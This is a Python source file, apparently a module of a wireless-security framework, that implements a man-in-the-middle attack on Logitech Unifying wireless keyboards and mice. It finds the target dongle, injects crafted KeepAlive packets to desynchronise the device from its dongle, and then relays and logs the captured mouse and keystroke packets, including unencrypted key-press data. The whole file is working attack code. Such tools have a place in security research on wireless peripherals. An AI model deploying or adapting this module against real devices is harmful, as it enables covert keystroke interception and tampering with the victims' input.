from mirage.libs import esb,utils,io,wireless
from mirage.core import module
import random
from enum import IntEnum

class ESBMitmStage(IntEnum):
	SCAN = 1
	DESYNC = 2
	ACTIVE_MITM = 3
	STOP = 4


class esb_mitm(module.WirelessModule):
	def init(self):
		self.technology = "esb"
		self.type = "attack"
		self.description = "Man-in-the-Middle module for Logitech Unifying devices"
		self.args = {
				"INTERFACE1":"rfstorm0",
				"INTERFACE2":"rfstorm1",
				"TARGET":"",
				"SHOW_ACK":"no",
				"TIMEOUT":"2",
				"SCENARIO":""
			}
		self.channels = [5, 8, 11, 14, 17, 20, 29, 32, 35, 38, 41, 44, 47, 56, 59, 62, 65, 68, 71, 74]
		self.stage = ESBMitmStage.SCAN
		self.lastFrame = None
		self.ackCount = 0
		self.injectionCount = 0

	def pickChannel(self):
		self.ackCount = 0
		return self.channels[random.randint(0,len(self.channels)-1)]

	# Scenario-related methods
	@module.scenarioSignal("onStart")
	def startScenario(self):
		pass

	@module.scenarioSignal("onEnd")
	def endScenario(self):
		pass

	# Stage-related method
	@module.scenarioSignal("onStageChange")
	def setStage(self, value):
		self.stage = value

	# Packet-related methods
	@module.scenarioSignal("onLogitechMousePacket")
	def logitechMousePacket(self,pkt):
		io.info("Mouse packet (from device): x = "+str(pkt.x)+" / y = "+str(pkt.y)+(" / button = "+str(pkt.button) if pkt.button != "" else ""))
		io.info("Redirecting to dongle ...")
		self.dongleEmitter.sendp(pkt)

	@module.scenarioSignal("onLogitechSetTimeoutPacket")
	def logitechSetTimeoutPacket(self,pkt):
		io.info("Set Timeout packet (from device): timeout = "+str(pkt.timeout))
		io.info("Redirecting to dongle ...")
		self.dongleEmitter.sendp(pkt)

	@module.scenarioSignal("onLogitechUnencryptedKeyReleasePacket")
	def logitechUnencryptedKeyReleasePacket(self,pkt):
		io.info("Unencrypted Key Release Packet (from device)")
		io.info("Redirecting to dongle ...")
		self.dongleEmitter.sendp(pkt)

	@module.scenarioSignal("onLogitechUnencryptedKeyPressPacket")
	def logitechUnencryptedKeyPressPacket(self,pkt):
		io.info("Unencrypted Key Press Packet (from device): hidData = "+pkt.hidData.hex())
		io.info("Redirecting to dongle ...")
		self.dongleEmitter.sendp(pkt)

	@module.scenarioSignal("onLogitechKeepAlivePacket")
	def logitechKeepAlivePacket(self,pkt):
		io.info("Keep Alive Packet (from device): timeout = "+str(pkt.timeout))
		io.info("Redirecting to dongle ...")
		self.dongleEmitter.sendp(pkt)

	@module.scenarioSignal("onLogitechEncryptedKeystrokePacket")
	def logitechEncryptedKeystrokePacket(self,pkt):
		io.info("Encrypted Keystroke Packet (from device): hidData = "+pkt.hidData.hex()+" / aesCounter = "+str(pkt.aesCounter))
		io.info("Redirecting to dongle ...")
		self.dongleEmitter.sendp(pkt)

	@module.scenarioSignal("onLogitechMultimediaKeyPressPacket")
	def logitechMultimediaKeyPressPacket(self,pkt):
		io.info("Multimedia Key Press Packet (from device): hidData = "+pkt.hidData.hex())
		io.info("Redirecting to dongle ...")
		self.dongleEmitter.sendp(pkt)

	@module.scenarioSignal("onLogitechMultimediaKeyReleasePacket")
	def logitechMultimediaKeyReleasePacket(self,pkt):
		io.info("Multimedia Key Release Packet (from device)")
		io.info("Redirecting to dongle ...")
		self.dongleEmitter.sendp(pkt)

	@module.scenarioSignal("onAcknowledgmentPacket")
	def ackPacket(self,pkt):
		pass

	# Main device to dongle callback
	def deviceToDongle(self,pkt):
		if pkt.payload != b"" and pkt.payload != b"\x0f\x0f\x0f\x0f" and pkt.payload != b"\xFF"*32:
			self.lastFrame = utils.now()
			if self.stage == ESBMitmStage.DESYNC:
				self.deviceEmitter.sendp(esb.ESBLogitechKeepAlivePacket(address=self.args["TARGET"],timeout=1))
				pkt.show()
				io.info("Injecting malicious KeepAlive...")
				self.injectionCount += 1
				if self.injectionCount >= 20:
					self.injectionCount = 0
					io.info("Changing dongle channel !")
					self.dongleReceiver.setChannel(self.pickChannel())
			elif self.stage == ESBMitmStage.ACTIVE_MITM:
				self.dongleEmitter.clear()
				if isinstance(pkt,esb.ESBLogitechMousePacket):
					self.logitechMousePacket(pkt)
				elif isinstance(pkt,esb.ESBLogitechSetTimeoutPacket):
					self.logitechSetTimeoutPacket(pkt)
				elif isinstance(pkt,esb.ESBLogitechUnencryptedKeyReleasePacket):
					self.logitechUnencryptedKeyReleasePacket(pkt)
				elif isinstance(pkt,esb.ESBLogitechUnencryptedKeyPressPacket):
					self.logitechUnencryptedKeyPressPacket(pkt)
				elif isinstance(pkt,esb.ESBLogitechKeepAlivePacket):
					self.logitechKeepAlivePacket(pkt)
				elif isinstance(pkt,esb.ESBLogitechEncryptedKeystrokePacket):
					self.logitechEncryptedKeystrokePacket(pkt)
				elif isinstance(pkt,esb.ESBLogitechMultimediaKeyPressPacket):
					self.logitechMultimediaKeyPressPacket(pkt)
				elif isinstance(pkt,esb.ESBLogitechMultimediaKeyReleasePacket):
					self.logitechMultimediaKeyReleasePacket(pkt)
				self.dongleEmitter.sendp(esb.ESBLogitechKeepAlivePacket(address=self.args["TARGET"],timeout=1200))

	# Main dongle to device callback
	def dongleToDevice(self,pkt):
		if self.stage != ESBMitmStage.SCAN:
			if pkt.payload == b"" and self.stage == ESBMitmStage.DESYNC:
				self.ackCount+=1
				if self.ackCount >= 10:
					io.success("Acknowledgment received on channel "+str(self.dongleReceiver.getChannel())+ "!")
					io.info("Entering ACTIVE_MITM stage ...")
					self.setStage(ESBMitmStage.ACTIVE_MITM)
			if self.stage == ESBMitmStage.ACTIVE_MITM:
				self.ackPacket(pkt)
				if utils.booleanArg(self.args["SHOW_ACK"]):
					pkt.show()

	def checkCapabilities(self):
		dongleCapabilities = self.dongleReceiver.hasCapabilities("INJECTING", "SNIFFING_NORMAL")
		deviceCapabilities = self.deviceReceiver.hasCapabilities("INJECTING", "SNIFFING_NORMAL", "ACTIVE_SCANNING")
		return dongleCapabilities and deviceCapabilities

	def run(self):
		self.deviceReceiver = self.getReceiver(interface=self.args["INTERFACE1"])
		self.deviceEmitter = self.getEmitter(interface=self.args["INTERFACE1"])

		self.dongleReceiver = self.getReceiver(interface=self.args["INTERFACE2"])
		self.dongleEmitter = self.getEmitter(interface=self.args["INTERFACE2"])

		if self.checkCapabilities():

			self.deviceReceiver.enterSnifferMode(self.args["TARGET"])
			self.dongleReceiver.enterSnifferMode(self.args["TARGET"])

			self.deviceReceiver.onEvent("*",self.deviceToDongle)
			self.dongleReceiver.onEvent("*",self.dongleToDevice)
			if self.loadScenario():
				io.info("Scenario loaded !")
				self.startScenario()

			io.info("Entering SCAN stage ...")
			self.setStage(ESBMitmStage.SCAN)
			while not self.deviceReceiver.scan(self.channels):
				io.info("Looking for dongle ...")
				utils.wait(seconds=0.01)
			io.success("Dongle found !")

			io.info("Entering DESYNC stage ...")
			self.setStage(ESBMitmStage.DESYNC)

			dongleChannel = self.pickChannel()
			self.dongleReceiver.setChannel(dongleChannel)
			self.deviceReceiver.enableAutoAck()

			while self.stage != ESBMitmStage.STOP:
				io.info("Transmitting ACK frames for device on channel "+str(self.deviceReceiver.getChannel())+" ...")
				io.info("Transmitting KeepAlive frames for dongle on channel "+str(self.dongleReceiver.getChannel())+" ...")

				keepAlives = []
				keepAlives.append(esb.ESBLogitechKeepAlivePacket(address=self.args["TARGET"],timeout=1200))
				keepAlives.append(wireless.WaitPacket(time=10.0/1000.0))
				while self.stage == ESBMitmStage.DESYNC or self.stage == ESBMitmStage.ACTIVE_MITM:
					self.dongleEmitter.sendp(*keepAlives)
					utils.wait(seconds=0.001)
					if self.dongleEmitter.getChannel() == self.deviceEmitter.getChannel():
						self.dongleEmitter.setChannel(self.pickChannel())
						self.ackCount = 0
						self.injectionCount = 0
						self.setStage(ESBMitmStage.DESYNC)
						break
					if self.lastFrame is not None and utils.now() - self.lastFrame > utils.integerArg(self.args["TIMEOUT"]):
						io.fail("Device lost, terminating ...")
						self.setStage(ESBMitmStage.STOP)
						break

			if self.scenarioEnabled:
				self.endScenario()

			return self.ok()
		else:
			io.fail("Interfaces provided ("+str(self.args["INTERFACE1"])+", "+str(self.args["INTERFACE2"])+") are not able to run this module.")
			return self.nok()
